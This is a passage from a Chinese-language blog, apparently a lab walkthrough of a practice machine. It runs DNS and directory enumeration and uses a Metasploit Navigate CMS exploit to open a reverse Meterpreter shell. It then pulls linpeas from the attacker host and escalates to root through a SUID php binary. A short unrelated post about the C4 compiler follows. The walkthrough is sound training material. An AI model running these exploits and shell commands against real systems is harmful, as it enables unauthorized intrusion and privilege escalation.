<p>  <code>dnsrecon --domain &#123;&#123;example.com&#125;&#125; --dictionary &#123;&#123;path/to/dictionary.txt&#125;&#125; --type brt</code></p>
<ul>
<li>Scan a domain, performing a reverse lookup of IP ranges from the SPF record and saving the results to a JSON file:</li>
</ul>
<p>  <code>dnsrecon --domain &#123;&#123;example.com&#125;&#125; -s --json</code></p>
<ul>
<li>Scan a domain, performing a Google enumeration and saving the results to a CSV file:</li>
</ul>
<p>  <code>dnsrecon --domain &#123;&#123;example.com&#125;&#125; -g --csv</code></p>
<ul>
<li>Scan a domain, performing DNS cache snooping:</li>
</ul>
<p>  <code>dnsrecon --domain &#123;&#123;example.com&#125;&#125; --type snoop --name_server &#123;&#123;nameserver.example.com&#125;&#125; --dictionary &#123;&#123;path/to/dictionary.txt&#125;&#125;</code></p>
<ul>
<li>Scan a domain, performing zone walking:</li>
</ul>
<p>  <code>dnsrecon --domain &#123;&#123;example.com&#125;&#125; --type zonewalk</code></p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">──(root㉿kali)-[~]</span><br><span class="line">└─# **dnsrecon -r 127.0.0.0/24 -n 192.168.19.144**       </span><br><span class="line">[*] Performing Reverse Lookup from 127.0.0.0 to 127.0.0.255</span><br><span class="line">[+]      **PTR blackpearl.tcm 127.0.0.1**</span><br><span class="line">[+] 1 Records Found</span><br></pre></td></tr></table></figure>

<p>把這網域新增到&#x2F;etc&#x2F;hosts，這樣才能訪問到那網頁位置，並開啟那網頁嘗試訪問</p>
<p><img src="/img/privilege_Untitled_43.png" alt="Untitled"></p>
<p><img src="/img/privilege_Untitled_44.png" alt="Untitled"></p>
<p>接下來看看網頁下是否有潛藏的目錄內容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt:FUZZ -u http://blackpearl.tcm/FUZZ**</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://blackpearl.tcm/FUZZ</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 86789, Words: 4212, Lines: 1040, Duration: 9ms]</span></span><br><span class="line"><span class="string"># directory-list-2.3-medium.txt [Status: 200, Size: 86789, Words: 4212, Lines: 1040, Duration: 11ms]</span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 86789, Words: 4212, Lines: 1040, Duration: 14ms]</span></span><br><span class="line"><span class="string"># Copyright 2007 James Fisher [Status: 200, Size: 86789, Words: 4212, Lines: 1040, Duration: 19ms]</span></span><br><span class="line"><span class="string"># This work is licensed under the Creative Commons  [Status: 200, Size: 86789, Words: 4212, Lines: 1040, Duration: 21ms]</span></span><br><span class="line"><span class="string"># Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 86789, Words: 4212, Lines: 1040, Duration: 25ms]</span></span><br><span class="line"><span class="string"># license, visit http://creativecommons.org/licenses/by-sa/3.0/  [Status: 200, Size: 86789, Words: 4212, Lines: 1040, Duration: 28ms]</span></span><br><span class="line"><span class="string"># or send a letter to Creative Commons, 171 Second Street,  [Status: 200, Size: 86789, Words: 4212, Lines: 1040, Duration: 31ms]</span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 86789, Words: 4212, Lines: 1040, Duration: 34ms]</span></span><br><span class="line"><span class="string"># Priority ordered case sensative list, where entries were found  [Status: 200, Size: 86790, Words: 4212, Lines: 1040, Duration: 37ms]</span></span><br><span class="line"><span class="string"># on atleast 2 different hosts [Status: 200, Size: 86790, Words: 4212, Lines: 1040, Duration: 41ms]</span></span><br><span class="line"><span class="string">#                       [Status: 200, Size: 86790, Words: 4212, Lines: 1040, Duration: 45ms]</span></span><br><span class="line"><span class="string">                        [Status: 200, Size: 86790, Words: 4212, Lines: 1040, Duration: 47ms]</span></span><br><span class="line"><span class="string"># Attribution-Share Alike 3.0 License. To view a copy of this  [Status: 200, Size: 86790, Words: 4212, Lines: 1040, Duration: 68ms]</span></span><br><span class="line"><span class="string">**navigate                [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 5ms]**</span></span><br><span class="line"><span class="string">                        [Status: 200, Size: 86790, Words: 4212, Lines: 1040, Duration: 10ms]</span></span><br><span class="line"><span class="string">:: Progress: [220560/220560] :: Job [1/1] :: 7407 req/sec :: Duration: [0:00:29] :: Errors: 0 ::</span></span><br></pre></td></tr></table></figure>

<p>查看到navigate目錄下是登入頁面</p>
<ul>
<li>Navigate CMS v2.8, © 2024</li>
</ul>
<p><img src="/img/privilege_Untitled_45.png" alt="Untitled"></p>
<ul>
<li>查看該版本可能的利用點</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjdhKjWzLKEAxWbrlYBHarBDEEQFnoECA0QAQ&url=https://www.rapid7.com/db/modules/exploit/multi/http/navigate_cms_rce/&usg=AOvVaw0YC3U48-x5GBaLUam_sYrP&opi=89978449">Navigate CMS Unauthenticated Remote Code Execution</a></p>
<p><a target="_blank" rel="noopener" href="https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjdhKjWzLKEAxWbrlYBHarBDEEQFnoECBEQAQ&url=https://github.com/0x4r2/Navigate-CMS-RCE-Unauthenticated-&usg=AOvVaw2kvp91G1FyoMXbtaidHmEF&opi=89978449">GitHub - 0x4r2&#x2F;Navigate-CMS-RCE-Unauthenticated-: This module exploits insufficient sanitization in the database::protect method, of Navigate CMS versions 2.8</a></p>
<p><a target="_blank" rel="noopener" href="https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjdhKjWzLKEAxWbrlYBHarBDEEQFnoECA8QAQ&url=https://www.exploit-db.com/exploits/45561&usg=AOvVaw0ZgfU3dceG_UvE4GwEcOXX&opi=89978449">Navigate CMS - (Unauthenticated) Remote Code Execution (Metasploit)</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt;  **use exploit/multi/http/navigate_cms_rce**</span><br><span class="line">[*] No payload configured, defaulting to php/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/http/navigate_cms_rce) &gt; **options** </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/http/navigate_cms_rce):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   **RHOSTS                      <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metas**</span><br><span class="line">                                         ploit/basics/using-metasploit.html</span><br><span class="line">   RPORT      80               <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /navigate/       <span class="built_in">yes</span>       Base Navigate CMS directory path</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   **LHOST  192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)**</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   **0   Automatic**</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/http/navigate_cms_rce) &gt; show targets </span><br><span class="line"></span><br><span class="line">Exploit targets:</span><br><span class="line">=================</span><br><span class="line"></span><br><span class="line">    Id  Name</span><br><span class="line">    --  ----</span><br><span class="line">=&gt;  0   Automatic</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/http/navigate_cms_rce) &gt; **<span class="built_in">set</span> target 0**</span><br><span class="line">target =&gt; 0</span><br><span class="line">msf6 exploit(multi/http/navigate_cms_rce) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/http/navigate_cms_rce):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS                      <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metas</span><br><span class="line">                                         ploit/basics/using-metasploit.html</span><br><span class="line">   RPORT      80               <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /navigate/       <span class="built_in">yes</span>       Base Navigate CMS directory path</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/http/navigate_cms_rce) &gt; **<span class="built_in">set</span> rhost 192.168.19.144**</span><br><span class="line">rhost =&gt; 192.168.19.144</span><br><span class="line">msf6 exploit(multi/http/navigate_cms_rce) &gt; **<span class="built_in">set</span> vhost blackpearl.tcm**</span><br><span class="line">vhost =&gt; blackpearl.tcm</span><br><span class="line">msf6 exploit(multi/http/navigate_cms_rce) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/http/navigate_cms_rce):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description</span><br><span class="line">   ----       ---------------  --------  -----------</span><br><span class="line">   Proxies                     no        A proxy chain of format <span class="built_in">type</span>:host:port[,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS     192.168.19.144   <span class="built_in">yes</span>       The target host(s), see https://docs.metasploit.com/docs/using-metas</span><br><span class="line">                                         ploit/basics/using-metasploit.html</span><br><span class="line">   RPORT      80               <span class="built_in">yes</span>       The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">false</span>            no        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   TARGETURI  /navigate/       <span class="built_in">yes</span>       Base Navigate CMS directory path</span><br><span class="line">   VHOST      blackpearl.tcm   no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.168.19.130   <span class="built_in">yes</span>       The listen address (an interface may be specified)</span><br><span class="line">   LPORT  4444             <span class="built_in">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d <span class="built_in">command</span>.</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/http/navigate_cms_rce) &gt; **run**</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.19.130:4444 </span><br><span class="line">[+] Login bypass successful</span><br><span class="line">[+] Upload successful</span><br><span class="line">[*] Triggering payload...</span><br><span class="line">[*] Sending stage (39927 bytes) to 192.168.19.144</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.19.130:4444 -&gt; 192.168.19.144:45840) at 2024-02-17 09:46:30 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; **shell**</span><br><span class="line">Process 1843 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">www-data</span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/var/www/blackpearl.tcm/navigate</span><br></pre></td></tr></table></figure>

<p>想要讓shell介面更好看</p>
<p><a target="_blank" rel="noopener" href="https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell">https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell</a></p>
<ul>
<li><p>TTY Shell</p>
  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> os.system(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br><span class="line"></span><br><span class="line">/bin/sh -i</span><br><span class="line"></span><br><span class="line">perl —e <span class="string">&#x27;exec &quot;/bin/sh&quot;;&#x27;</span></span><br><span class="line"></span><br><span class="line">perl: <span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"></span><br><span class="line">ruby: <span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line"></span><br><span class="line">lua: os.execute(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">(From within IRB)</span><br><span class="line"><span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line"></span><br><span class="line">(From within vi)</span><br><span class="line">:!bash</span><br><span class="line"></span><br><span class="line">(From within vi)</span><br><span class="line">:<span class="built_in">set</span> shell=/bin/bash:shell</span><br><span class="line"></span><br><span class="line">(From within nmap)</span><br><span class="line">!sh</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">which</span> python</span><br><span class="line">/usr/bin/python</span><br><span class="line">**python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span>**  </span><br><span class="line">www-data@blackpearl:~/blackpearl.tcm/navigate$</span><br></pre></td></tr></table></figure>

<p>利用<a target="_blank" rel="noopener" href="http://linpeas.sh/">linpeas.sh</a>獲取伺服器有用資訊，進行linux提權</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@blackpearl:/tmp$  **wget http://192.168.19.130/linpeas.sh linpeas.sh**</span><br><span class="line"> wget http://192.168.19.130/linpeas.sh linpeas.sh</span><br><span class="line">--2024-02-17 10:36:38--  http://192.168.19.130/linpeas.sh</span><br><span class="line">Connecting to 192.168.19.130:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 853290 (833K) [text/x-sh]</span><br><span class="line">Saving to: <span class="string">&#x27;linpeas.sh&#x27;</span></span><br><span class="line"></span><br><span class="line">linpeas.sh          100%[===================&gt;] 833.29K  --.-KB/s    <span class="keyword">in</span> 0.05s   </span><br><span class="line"></span><br><span class="line">2024-02-17 10:36:38 (16.2 MB/s) - <span class="string">&#x27;linpeas.sh&#x27;</span> saved [853290/853290]</span><br><span class="line"></span><br><span class="line">--2024-02-17 10:36:38--  http://linpeas.sh/</span><br><span class="line">Resolving linpeas.sh (linpeas.sh)... failed: Temporary failure <span class="keyword">in</span> name resolution.</span><br><span class="line">wget: unable to resolve host address <span class="string">&#x27;linpeas.sh&#x27;</span></span><br><span class="line">FINISHED --2024-02-17 10:37:03--</span><br><span class="line">Total wall clock <span class="keyword">time</span>: 25s</span><br><span class="line">Downloaded: 1 files, 833K <span class="keyword">in</span> 0.05s (16.2 MB/s)</span><br><span class="line">www-data@blackpearl:/tmp$ <span class="built_in">ls</span> -al</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">total 868</span><br><span class="line">drwxrwxrwt  8 root     root       4096 Feb 17 10:39 .</span><br><span class="line">drwxr-xr-x 18 root     root       4096 May 30  2021 ..</span><br><span class="line">drwxrwxrwt  2 root     root       4096 Feb 17  2024 .ICE-unix</span><br><span class="line">drwxrwxrwt  2 root     root       4096 Feb 17  2024 .Test-unix</span><br><span class="line">drwxrwxrwt  2 root     root       4096 Feb 17  2024 .X11-unix</span><br><span class="line">drwxrwxrwt  2 root     root       4096 Feb 17  2024 .XIM-unix</span><br><span class="line">drwxrwxrwt  2 root     root       4096 Feb 17  2024 .font-unix</span><br><span class="line">**-rw-r--r--  1 www-data www-data 853290 Feb 15 14:03 linpeas.sh**</span><br><span class="line">drwx------  3 root     root       4096 Feb 17  2024 systemd-private-377639e5743d4205b9d4759ec2aad65c-systemd-timesyncd.service-q855cz</span><br><span class="line">www-data@blackpearl:/tmp$ **<span class="built_in">chmod</span> +x linpeas.sh**</span><br><span class="line"><span class="built_in">chmod</span> +x linpeas.sh</span><br><span class="line">www-data@blackpearl:/tmp$ **./linpeas.sh**</span><br><span class="line">./linpeas.sh</span><br><span class="line">....</span><br><span class="line">╔══════════╣ SUID - Check easy privesc, exploits and write perms</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                               </span><br><span class="line">strings Not Found                                                                                              </span><br><span class="line">strace Not Found                                                                                               </span><br><span class="line">-rwsr-xr-- 1 root messagebus 50K Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                      </span><br><span class="line">-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device</span><br><span class="line">-rwsr-xr-x 1 root root 427K Jan 31  2020 /usr/lib/openssh/ssh-keysign</span><br><span class="line">-rwsr-xr-x 1 root root 35K Jan 10  2019 /usr/bin/umount  ---&gt;  BSD/Linux(08-1996)</span><br><span class="line">-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/newgrp  ---&gt;  HP-UX_10.20</span><br><span class="line">-rwsr-xr-x 1 root root 51K Jan 10  2019 /usr/bin/mount  ---&gt;  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                                                   </span><br><span class="line">-rwsr-xr-x 1 root root 4.6M Feb 13  2021 /usr/bin/php7.3 (Unknown SUID binary!)</span><br><span class="line">-rwsr-xr-x 1 root root 63K Jan 10  2019 /usr/bin/su</span><br><span class="line">-rwsr-xr-x 1 root root 53K Jul 27  2018 /usr/bin/chfn  ---&gt;  SuSE_9.3/10</span><br><span class="line">-rwsr-xr-x 1 root root 63K Jul 27  2018 /usr/bin/passwd  ---&gt;  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                        </span><br><span class="line">-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/chsh</span><br><span class="line">-rwsr-xr-x 1 root root 83K Jul 27  2018 /usr/bin/gpasswd</span><br><span class="line"></span><br><span class="line">╔══════════╣ SGID</span><br><span class="line">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                               </span><br><span class="line">-rwxr-sr-x 1 root shadow 31K Jul 27  2018 /usr/bin/expiry                                                      </span><br><span class="line">-rwxr-sr-x 1 root <span class="built_in">tty</span> 35K Jan 10  2019 /usr/bin/wall</span><br><span class="line">-rwxr-sr-x 1 root ssh 315K Jan 31  2020 /usr/bin/ssh-agent</span><br><span class="line">-rwxr-sr-x 1 root <span class="built_in">tty</span> 15K May  4  2018 /usr/bin/bsd-write</span><br><span class="line">-rwxr-sr-x 1 root crontab 43K Oct 11  2019 /usr/bin/crontab</span><br><span class="line">-rwxr-sr-x 1 root mail 19K Dec  3  2017 /usr/bin/dotlockfile</span><br><span class="line">-rwxr-sr-x 1 root shadow 71K Jul 27  2018 /usr/bin/chage</span><br><span class="line">-rwxr-sr-x 1 root shadow 39K Feb 14  2019 /usr/sbin/unix_chkpwd</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">╔══════════╣ Backup files (limited 100)</span><br><span class="line">-rwxr-xr-x 1 www-data www-data 1421 May 30  2021 /var/www/blackpearl.tcm/navigate/lib/external/tracy/src/Tracy/assets/Debugger/error.500.phtml.bak</span><br><span class="line">**-rwxr-xr-x 1 www-data www-data 12282 May 30  2021 /var/www/blackpearl.tcm/navigate/lib/packages/backups/backups.php**</span><br><span class="line">-rwxr-xr-x 1 www-data www-data 12546 May 30  2021 /var/www/blackpearl.tcm/navigate/lib/packages/backups/backup.class.php</span><br><span class="line">-rw-r--r-- 1 root root 348 Nov 25  2020 /usr/share/man/man1/wsrep_sst_mariabackup.1.gz</span><br><span class="line">-rw-r--r-- 1 root root 363752 Apr 30  2018 /usr/share/doc/manpages/Changes.old.gz</span><br><span class="line">-rw-r--r-- 1 root root 303 Oct 26  2018 /usr/share/doc/hdparm/changelog.old.gz</span><br><span class="line">-rw-r--r-- 1 root root 7867 Jul 16  1996 /usr/share/doc/telnet/README.old.gz</span><br><span class="line">-rw-r--r-- 1 root root 9716 Nov 28  2020 /usr/lib/modules/4.19.0-13-amd64/kernel/drivers/net/team/team_mode_activebackup.ko</span><br><span class="line">-rw-r--r-- 1 root root 9731 Mar 19  2021 /usr/lib/modules/4.19.0-16-amd64/kernel/drivers/net/team/team_mode_activebackup.ko</span><br><span class="line">-rwxr-xr-x 1 root root 38412 Nov 25  2020 /usr/bin/wsrep_sst_mariabackup</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>控制文件訪問權限、分別允許用戶以可執行文件的 owner 或 owner group 的權限運行可執行文件</p>
<p>SUID &gt;</p>
<ul>
<li>普通用戶想運行只有權限高用戶才能執行的文件，就要通過SUID的功能</li>
<li>owner的訊息為rws而不是rwx，當s出現在文件擁有者的權限上時，就稱為SETUID BITS或SETUID<ul>
<li>SUID權限僅對二進制可執行文件有效</li>
<li>執行者對二進制可執行文件具有x的權限，執行者將具有該文件的所有者權限</li>
<li>權限僅在<strong>執行二進制可執行文件的過程</strong>中有效</li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">**-rws**r-xr-- 1 root messagebus 50K Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                      </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/privilege_Untitled_46.png" alt="Untitled"></p>
<p>SGID &gt; </p>
<ul>
<li><p>當一般使用者 tester 執行 mlocate 指令時，tester 就會取得使用者群組 mlocate 的執行權限，又因為使用者群組 mlocate 對 mlocate.db 有讀取權限，所以 tester 就可以讀取 mlocate.db 了。</p>
<p>  <img src="/img/privilege_Untitled_47.png" alt="Untitled"></p>
</li>
<li><p>SGID 也可以用在目錄上</p>
<ul>
<li>使用者若對此目錄具有 r 和 x 權限，則該使用者能夠進入該目錄</li>
<li>使用者在此目錄下的有效使用者群組將變成該目錄的使用者群組</li>
<li>若使用者在此目錄下擁有 w 權限，則使用者建立的新檔案的使用者群組與該目錄的使用者群組相同</li>
</ul>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-rwx**r-s**r-x 1 root shadow 31K Jul 27  2018 /usr/bin/expiry                                                      </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>當 SGID 作用於普通檔案時，和 SUID 類似，在執行該檔案時，<strong>使用者將獲得該檔案所屬群組的權限</strong>。</p>
<p>當 SGID 作用於目錄時，意義就非常重大了。當使用者對<strong>某一目錄有寫入和執行權限</strong>時，該使用者就可以在該<strong>目錄下建立文件</strong>，如果該目錄以 SGID 修飾，則該使用者在這個目錄下建立的文件都是屬於這個目錄所屬的群組。</p>
<p>以數字的方式設定權限:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SUID-&gt;4</span><br><span class="line">SGID-&gt;2</span><br></pre></td></tr></table></figure>

<p>找出所有SUID</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@blackpearl:/tmp$ find / -<span class="built_in">type</span> f -perm -4000 2&gt;/dev/null</span><br><span class="line"><span class="comment">#在系統中尋找擁有SUID權限設置的文件。具有SUID權限的文件在執行時將以其擁有者的身份而不是執行者的身份運行</span></span><br><span class="line">find / -<span class="built_in">type</span> f -perm -4000 2&gt;/dev/null</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/mount</span><br><span class="line">**/usr/bin/php7.3**</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">www-data@blackpearl:/tmp$</span><br></pre></td></tr></table></figure>

<p>Google搜尋GTFOBins &gt; SUID&gt;</p>
<p>查找列出的指令跟上面列出的擁有SUID權限設置的文件只有php剛好匹配，利用它做權限提升</p>
<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/php/">https://gtfobins.github.io/gtfobins/php/</a></p>
<p><img src="/img/privilege_Untitled_48.png" alt="Untitled"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@blackpearl:/tmp$ **/usr/bin/php7.3  -r <span class="string">&quot;pcntl_exec(&#x27;/bin/sh&#x27;, [&#x27;-p&#x27;]);&quot;</span>**</span><br><span class="line">&lt;usr/bin/php7.3  -r <span class="string">&quot;pcntl_exec(&#x27;/bin/sh&#x27;, [&#x27;-p&#x27;]);&quot;</span></span><br><span class="line"><span class="comment"># id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=33(www-data) gid=33(www-data) **euid=0(root)** <span class="built_in">groups</span>=33(www-data)</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="built_in">cd</span> /root</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">flag.txt</span><br><span class="line"><span class="comment"># cat flag.txt</span></span><br><span class="line"><span class="built_in">cat</span> flag.txt</span><br><span class="line">Good job on this one.</span><br><span class="line">Finding the domain name may have been a little guessy,</span><br><span class="line">but the goal of this box is mainly to teach about Virtual Host Routing <span class="built_in">which</span> is used <span class="keyword">in</span> a lot of CTF.</span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>
      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-c4" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/c4/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.077Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/c4/">
        C4 - C In Four Functions
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="4個函數，528行代碼實現可自舉的C語言編譯器"><a href="#4個函數，528行代碼實現可自舉的C語言編譯器" class="headerlink" title="4個函數，528行代碼實現可自舉的C語言編譯器"></a><strong>4個函數，528行代碼實現可自舉的C語言編譯器</strong></h1><p>C4怎麼工作？</p>
<p>模擬程式運作機制定義了簡單的vm（虛擬機器）的暫存器，程式運行的資料和程式碼段等<br>透過解析輸入檔的字元流，生產資料段和程式碼段的內容<br>透過讀取程式碼段的內容，模擬執行，輸出結果。<br>特別說明</p>
<p>這裡的模擬執行其實就是特定的符號映射成一般的c語言的程式設計過程：</p>
<p>如模擬執行的程式碼ADD，就是程式設計時的+</p>
<p>如模擬執行的PRTF，就是呼叫一般的printf</p>
